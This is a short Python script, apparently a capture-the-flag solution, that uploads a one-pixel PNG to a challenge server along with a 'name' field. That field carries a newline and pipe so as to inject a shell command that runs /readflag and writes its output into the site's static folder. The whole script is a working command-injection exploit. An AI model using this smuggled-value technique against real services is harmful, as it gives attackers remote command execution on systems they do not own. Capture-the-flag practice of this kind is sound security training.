import requests
url = 'https://aa1fadfd635d-magik.challs.m0lecon.it'
png = bytes.fromhex('89504e470d0a1a0a0000000d494844520000000100000001080200000090775300000006504c5445200000a2997607000000ff49454e44ae426082')
name = "test\n|/readflag>/app/static/flag"
files = {'img': ('tiny.png', png, 'image/png')}
data = {'name': name}
resp = requests.post(url, files=files, data=data, timeout=10)
print('status', resp.status_code)
print(resp.text[:200])
